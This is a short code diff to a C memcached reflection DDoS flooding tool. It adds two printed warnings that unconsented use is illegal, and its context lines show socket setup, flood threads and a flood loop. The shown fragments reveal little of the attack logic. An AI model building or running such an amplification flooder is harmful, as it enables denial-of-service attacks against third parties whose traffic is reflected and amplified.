@@ -14,6 +14,7 @@ Compile: gcc memcached.c -o memecached -pthread
    memcache reflection script
    greeting: syn, storm, krashed, chrono, spike, niko, disliked
    Educational and/or testing purposes only.
+   
 */
 
 #include <time.h>
@@ -153,6 +154,7 @@ int main(int argc, char *argv[ ])
 	srand(time(NULL));
 	int i = 0;
 	head = NULL;
+	fprintf(stdout, "Remember! Using this program without there consent is ILLEGAL!\n");
 	fprintf(stdout, "Setting up sockets...\n");
 	int max_len = 128;
 	char *buffer = (char *) malloc(max_len);
@@ -199,6 +201,7 @@ int main(int argc, char *argv[ ])
 		td[i].list_node = current;
 		pthread_create( &thread[i], NULL, &flood, (void *) &td[i]);
 	}
+	fprintf(stdout, "Remember! Using this program without there consent is ILLEGAL!\n");
 	fprintf(stdout, "Starting flood...\n");
 	for(i = 0;i<(atoi(argv[6])*multiplier);i++)
 	{
